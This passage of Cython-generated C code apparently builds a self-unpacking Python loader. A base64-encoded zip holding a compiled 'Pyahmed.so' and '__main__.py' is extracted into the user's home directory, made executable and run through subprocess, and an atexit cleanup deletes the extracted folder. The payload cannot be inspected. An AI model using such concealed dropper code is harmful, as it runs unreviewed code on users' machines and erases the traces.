ntGmyr5NUBhrQ6Ph3o+4dTsGEzF0h8xOCdiddgVzJGFwk47/AWAmM8LlZbYsEB3QpAdwT0JrI5CotZMIcoOsgEh2knA8PvxQNGqFVzjamqbR1t3WpDZ2fD/SqrWTIKmRVLaoUVFHToFvLTwTjlsGZr+xksuggjnYjdaHcu73ZtSOOFCTMMLOaliRWL3po42Byr4pRKLCSJmRaSwnCb14WlnhLsAxt4pkMjQVzX8tRpAbI5y5rD2nQ+yIXd+hTZcvFu4dLr/DPrdVnDGDURBwQ0d4Qu7YI6jjzMF7Ywnc22ahXnsS3dLXV8gGPBHc2OmclCOTTH6dKGbE4Gk7wMtVQqnmAX0NtTiWhYpSulpGFbjxr0AQEjJW8FGoNpndjaApYKhpKxlGdS3P5go1bJWiFE2oSh6vRpCjWcHhwU9j6sE6SE6HTCjwtKWLNmrdJpZ4QB7E8Tia29K90XisH2R5jhxMlNWKBZSxJhLBFss4/vbDogLdoI9in9/bG0HuENlCg1t7rNbFdBe5t5pC2obdKIwAEQd04uzXMIK5rXYX9YD7L7sxrJthojHZasBsighT2E2EKmNF4w2RXFdybiJEiHxGTa0M0lJe9dsLuwLRVD4kbPmjQazXs2tNjScV3Yfjln7xFryuI9PJDSdNqjxYUBti5+BGpkH2ArkFiM/Gy6OZ6T4XWTuIQjlW1uU3l2WImxsT/AFrqNyMn2LJDQN8djZKbTBZ/mwaRB2jRWJP25dk1JpkJGjKUOY0Q4nZSGTuipW+JslwD+qVAkJTaerJ9+51aTOWpLPBXEDYx9MiE28tB0yUKLXinXRwdJGy2HhJiM8H+xzxAo5QPxdHmEDObl4dE4BGcSKpL68Ltd4oUKfiktFiQB8V/JmKGUG2ScK08l6M6yXIuwszQ1Ek5ZV0o5LOnpAxrBVCo4Ssyw/t0PF/zfoDs4GA1BwrBCLWcqYZZQymFUGdRg+T5bdxP8zYO/Ig6K7PJ6Kfw86Xo5/F0iRCstssvuS5lcgP7Fiv367fD3u0wmweMni+2yXgrP43O3Cv6uENKfLLbLwHVMEhvnC/FLUdYgN/O/xC6fvNKenpz/dfCXEex/coVd7p1nt18qXuUe+HtTiO97hyQVy/55Snb+70fdPH79O+zyWIk9fTn/IfRbz/3X2uXhq6z41znEj6BdWM3KkXvs8uzldntLJPsHpfiT3XZZummRLfwCxe50xd5+j39ukU0GqnOn/7gU3/fTRTZ55jJ7eDn9D0nxS15eZJPHbraHl+vvGbRpPl6X/v5Km5TtLZbk5+HvKiF+GcYryzP+V+DvaiF+HcaryzP+txRWdzx+K8bjsgIL5hIpHtf7VworPx5/5L+utMkx3jBc0j8mxWelYcn6q53jc/djZDx+/dVX2eSRxbnj/wTTr5A4j79a4vMcZJGS7UYw/umt7Jr0tzeLsvvf""5YqYd8v1xlj8F593Tp+7a1ziLylhBXfKxX7u/j9QSwECFAMUAAAACABiiKdaO43DCpMBAAA2AgAACwAAAAAAAAAAAAAAgIEAAAAAX19tYWluX18ucHlQSwECFAMUAAAACABiiKdaFVgcI4UJAwB4Fw8ACgAAAAAAAAAAAAAAwIG8AQAAUHlhaG1lZC5zb1BLBQYAAAAAAgACAHEAAABpCwMAAAA=";
static PyObject *__pyx_n_s_AH;
static PyObject *__pyx_n_s_BaseException;
static PyObject *__pyx_n_s_CalledProcessError;
static PyObject *__pyx_n_u_CanYou;
static PyObject *__pyx_n_s_Dev;
static PyObject *__pyx_n_s_Do_Not;
static PyObject *__pyx_n_u_Done;
static PyObject *__pyx_n_s_Mahos;
static PyObject *__pyx_n_s_MyHome;
static PyObject *__pyx_kp_u_Pyahmed_so;
static PyObject *__pyx_n_s_Pyprivate;
static PyObject *__pyx_kp_u_UEsDBBQAAAAIAGKIp1o7jcMKkwEAADYC;
static PyObject *__pyx_n_s_ZipFile;
static PyObject *__pyx_kp_u__2;
static PyObject *__pyx_n_s_atexit;
static PyObject *__pyx_n_s_b64decode;
static PyObject *__pyx_n_s_base64;
static PyObject *__pyx_n_s_check;
static PyObject *__pyx_n_s_chmod;
static PyObject *__pyx_n_s_cleanup;
static PyObject *__pyx_n_s_cline_in_traceback;
static PyObject *__pyx_n_s_cwd;
static PyObject *__pyx_n_s_e;
static PyObject *__pyx_n_s_enter;
static PyObject *__pyx_n_s_exists;
static PyObject *__pyx_n_s_exit;
static PyObject *__pyx_n_s_expanduser;
static PyObject *__pyx_n_s_extractall;
static PyObject *__pyx_n_s_f;
static PyObject *__pyx_n_s_import;
static PyObject *__pyx_n_s_join;
static PyObject *__pyx_n_s_main;
static PyObject *__pyx_kp_u_main___py;
static PyObject *__pyx_n_s_makedirs;
static PyObject *__pyx_n_s_name;
static PyObject *__pyx_n_s_open;
static PyObject *__pyx_n_s_os;
static PyObject *__pyx_n_s_path;
static PyObject *__pyx_n_s_print;
static PyObject *__pyx_n_s_pyahmed_path;
static PyObject *__pyx_kp_u_pyprivate;
static PyObject *__pyx_n_u_python;
static PyObject *__pyx_n_u_r;
static PyObject *__pyx_n_s_register;
static PyObject *__pyx_n_s_rmtree;
static PyObject *__pyx_n_s_run;
static PyObject *__pyx_n_s_shutil;
static PyObject *__pyx_n_s_source;
static PyObject *__pyx_kp_s_source_py;
static PyObject *__pyx_n_s_subprocess;
static PyObject *__pyx_n_s_test;
static PyObject *__pyx_n_u_wb;
static PyObject *__pyx_n_s_write;
static PyObject *__pyx_n_s_zip_ref;
static PyObject *__pyx_n_s_zipfile;
static PyObject *__pyx_pf_6source_cleanup(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_int_493;
static PyObject *__pyx_tuple_;
static PyObject *__pyx_tuple__3;
static PyObject *__pyx_tuple__5;
static PyObject *__pyx_codeobj__4;
/* Late includes */



/* Python wrapper */
static PyObject *__pyx_pw_6source_1cleanup(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_1cleanup = {"cleanup", (PyCFunction)__pyx_pw_6source_1cleanup, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_1cleanup(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("cleanup (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_cleanup(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_cleanup(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  int __pyx_t_5;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  int __pyx_t_9;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("cleanup", 0);

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_path); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_exists); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_Pyprivate); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_4, __pyx_t_3) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_5 = __Pyx_PyObject_IsTrue(__pyx_t_1); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (__pyx_t_5) {

    
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_7, &__pyx_t_8);
      __Pyx_XGOTREF(__pyx_t_6);
      __Pyx_XGOTREF(__pyx_t_7);
      __Pyx_XGOTREF(__pyx_t_8);
      /*try:*/ {

        
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_shutil); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 18, __pyx_L4_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_rmtree); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 18, __pyx_L4_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_Pyprivate); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 18, __pyx_L4_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_4 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
          __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
          if (likely(__pyx_t_4)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
            __Pyx_INCREF(__pyx_t_4);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_3, function);
          }
        }
        __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_4, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2);
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 18, __pyx_L4_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

        
        __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple_, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L4_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

        
      }
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      goto __pyx_L9_try_end;
      __pyx_L4_error:;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __pyx_t_9 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
      if (__pyx_t_9) {
        __Pyx_ErrRestore(0,0,0);
        goto __pyx_L5_exception_handled;
      }
      goto __pyx_L6_except_error;
      __pyx_L6_except_error:;

      
      __Pyx_XGIVEREF(__pyx_t_6);
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
      goto __pyx_L1_error;
      __pyx_L5_exception_handled:;
      __Pyx_XGIVEREF(__pyx_t_6);
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
      __pyx_L9_try_end:;
    }

    
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_AddTraceback("source.cleanup", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/
static int __pyx_pymod_exec_source(PyObject* module); /*proto*/
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_source},
  {0, NULL}
};
#endif

static struct PyModuleDef __pyx_moduledef = {
    PyModuleDef_HEAD_INIT,
    "source",
    0, /* m_doc */
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    0, /* m_size */
  #else
    -1, /* m_size */
  #endif
    __pyx_methods /* m_methods */,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_moduledef_slots, /* m_slots */
  #else
    NULL, /* m_reload */
  #endif
    NULL, /* m_traverse */
    NULL, /* m_clear */
    NULL /* m_free */
};
#endif
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif

static __Pyx_StringTabEntry __pyx_string_tab[] = {
  {&__pyx_n_s_AH, __pyx_k_AH, sizeof(__pyx_k_AH), 0, 0, 1, 1},
  {&__pyx_n_s_BaseException, __pyx_k_BaseException, sizeof(__pyx_k_BaseException), 0, 0, 1, 1},
  {&__pyx_n_s_CalledProcessError, __pyx_k_CalledProcessError, sizeof(__pyx_k_CalledProcessError), 0, 0, 1, 1},
  {&__pyx_n_u_CanYou, __pyx_k_CanYou, sizeof(__pyx_k_CanYou), 0, 1, 0, 1},
  {&__pyx_n_s_Dev, __pyx_k_Dev, sizeof(__pyx_k_Dev), 0, 0, 1, 1},
  {&__pyx_n_s_Do_Not, __pyx_k_Do_Not, sizeof(__pyx_k_Do_Not), 0, 0, 1, 1},
  {&__pyx_n_u_Done, __pyx_k_Done, sizeof(__pyx_k_Done), 0, 1, 0, 1},
  {&__pyx_n_s_Mahos, __pyx_k_Mahos, sizeof(__pyx_k_Mahos), 0, 0, 1, 1},
  {&__pyx_n_s_MyHome, __pyx_k_MyHome, sizeof(__pyx_k_MyHome), 0, 0, 1, 1},
  {&__pyx_kp_u_Pyahmed_so, __pyx_k_Pyahmed_so, sizeof(__pyx_k_Pyahmed_so), 0, 1, 0, 0},
  {&__pyx_n_s_Pyprivate, __pyx_k_Pyprivate, sizeof(__pyx_k_Pyprivate), 0, 0, 1, 1},
  {&__pyx_kp_u_UEsDBBQAAAAIAGKIp1o7jcMKkwEAADYC, __pyx_k_UEsDBBQAAAAIAGKIp1o7jcMKkwEAADYC, sizeof(__pyx_k_UEsDBBQAAAAIAGKIp1o7jcMKkwEAADYC), 0, 1, 0, 0},
  {&__pyx_n_s_ZipFile, __pyx_k_ZipFile, sizeof(__pyx_k_ZipFile), 0, 0, 1, 1},
  {&__pyx_kp_u__2, __pyx_k__2, sizeof(__pyx_k__2), 0, 1, 0, 0},
  {&__pyx_n_s_atexit, __pyx_k_atexit, sizeof(__pyx_k_atexit), 0, 0, 1, 1},
  {&__pyx_n_s_b64decode, __pyx_k_b64decode, sizeof(__pyx_k_b64decode), 0, 0, 1, 1},
  {&__pyx_n_s_base64, __pyx_k_base64, sizeof(__pyx_k_base64), 0, 0, 1, 1},
  {&__pyx_n_s_check, __pyx_k_check, sizeof(__pyx_k_check), 0, 0, 1, 1},
  {&__pyx_n_s_chmod, __pyx_k_chmod, sizeof(__pyx_k_chmod), 0, 0, 1, 1},
  {&__pyx_n_s_cleanup, __pyx_k_cleanup, sizeof(__pyx_k_cleanup), 0, 0, 1, 1},
  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
  {&__pyx_n_s_cwd, __pyx_k_cwd, sizeof(__pyx_k_cwd), 0, 0, 1, 1},
  {&__pyx_n_s_e, __pyx_k_e, sizeof(__pyx_k_e), 0, 0, 1, 1},
  {&__pyx_n_s_enter, __pyx_k_enter, sizeof(__pyx_k_enter), 0, 0, 1, 1},
  {&__pyx_n_s_exists, __pyx_k_exists, sizeof(__pyx_k_exists), 0, 0, 1, 1},
  {&__pyx_n_s_exit, __pyx_k_exit, sizeof(__pyx_k_exit), 0, 0, 1, 1},
  {&__pyx_n_s_expanduser, __pyx_k_expanduser, sizeof(__pyx_k_expanduser), 0, 0, 1, 1},
  {&__pyx_n_s_extractall, __pyx_k_extractall, sizeof(__pyx_k_extractall), 0, 0, 1, 1},
  {&__pyx_n_s_f, __pyx_k_f, sizeof(__pyx_k_f), 0, 0, 1, 1},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_n_s_join, __pyx_k_join, sizeof(__pyx_k_join), 0, 0, 1, 1},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_kp_u_main___py, __pyx_k_main___py, sizeof(__pyx_k_main___py), 0, 1, 0, 0},
  {&__pyx_n_s_makedirs, __pyx_k_makedirs, sizeof(__pyx_k_makedirs), 0, 0, 1, 1},
  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
  {&__pyx_n_s_open, __pyx_k_open, sizeof(__pyx_k_open), 0, 0, 1, 1},
  {&__pyx_n_s_os, __pyx_k_os, sizeof(__pyx_k_os), 0, 0, 1, 1},
  {&__pyx_n_s_path, __pyx_k_path, sizeof(__pyx_k_path), 0, 0, 1, 1},
  {&__pyx_n_s_print, __pyx_k_print, sizeof(__pyx_k_print), 0, 0, 1, 1},
  {&__pyx_n_s_pyahmed_path, __pyx_k_pyahmed_path, sizeof(__pyx_k_pyahmed_path), 0, 0, 1, 1},
  {&__pyx_kp_u_pyprivate, __pyx_k_pyprivate, sizeof(__pyx_k_pyprivate), 0, 1, 0, 0},
  {&__pyx_n_u_python, __pyx_k_python, sizeof(__pyx_k_python), 0, 1, 0, 1},
  {&__pyx_n_u_r, __pyx_k_r, sizeof(__pyx_k_r), 0, 1, 0, 1},
  {&__pyx_n_s_register, __pyx_k_register, sizeof(__pyx_k_register), 0, 0, 1, 1},
  {&__pyx_n_s_rmtree, __pyx_k_rmtree, sizeof(__pyx_k_rmtree), 0, 0, 1, 1},
  {&__pyx_n_s_run, __pyx_k_run, sizeof(__pyx_k_run), 0, 0, 1, 1},
  {&__pyx_n_s_shutil, __pyx_k_shutil, sizeof(__pyx_k_shutil), 0, 0, 1, 1},
  {&__pyx_n_s_source, __pyx_k_source, sizeof(__pyx_k_source), 0, 0, 1, 1},
  {&__pyx_kp_s_source_py, __pyx_k_source_py, sizeof(__pyx_k_source_py), 0, 0, 1, 0},
  {&__pyx_n_s_subprocess, __pyx_k_subprocess, sizeof(__pyx_k_subprocess), 0, 0, 1, 1},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {&__pyx_n_u_wb, __pyx_k_wb, sizeof(__pyx_k_wb), 0, 1, 0, 1},
  {&__pyx_n_s_write, __pyx_k_write, sizeof(__pyx_k_write), 0, 0, 1, 1},
  {&__pyx_n_s_zip_ref, __pyx_k_zip_ref, sizeof(__pyx_k_zip_ref), 0, 0, 1, 1},
  {&__pyx_n_s_zipfile, __pyx_k_zipfile, sizeof(__pyx_k_zipfile), 0, 0, 1, 1},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  __pyx_builtin_open = __Pyx_GetBuiltinName(__pyx_n_s_open); if (!__pyx_builtin_open) __PYX_ERR(0, 31, __pyx_L1_error)
  __pyx_builtin_print = __Pyx_GetBuiltinName(__pyx_n_s_print); if (!__pyx_builtin_print) __PYX_ERR(0, 45, __pyx_L1_error)
  __pyx_builtin_BaseException = __Pyx_GetBuiltinName(__pyx_n_s_BaseException); if (!__pyx_builtin_BaseException) __PYX_ERR(0, 20, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  
  __pyx_tuple_ = PyTuple_Pack(1, __pyx_n_u_Done); if (unlikely(!__pyx_tuple_)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple_);
  __Pyx_GIVEREF(__pyx_tuple_);

  
  __pyx_tuple__3 = PyTuple_Pack(1, __pyx_kp_u__2); if (unlikely(!__pyx_tuple__3)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__3);
  __Pyx_GIVEREF(__pyx_tuple__3);

  
  __pyx_codeobj__4 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_cleanup, 15, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__4)) __PYX_ERR(0, 15, __pyx_L1_error)

  
  __pyx_tuple__5 = PyTuple_Pack(3, Py_None, Py_None, Py_None); if (unlikely(!__pyx_tuple__5)) __PYX_ERR(0, 31, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__5);
  __Pyx_GIVEREF(__pyx_tuple__5);
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_493 = PyInt_FromLong(493); if (unlikely(!__pyx_int_493)) __PYX_ERR(0, 4, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initsource(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC initsource(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_source(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_source(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_source(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  int __pyx_t_5;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
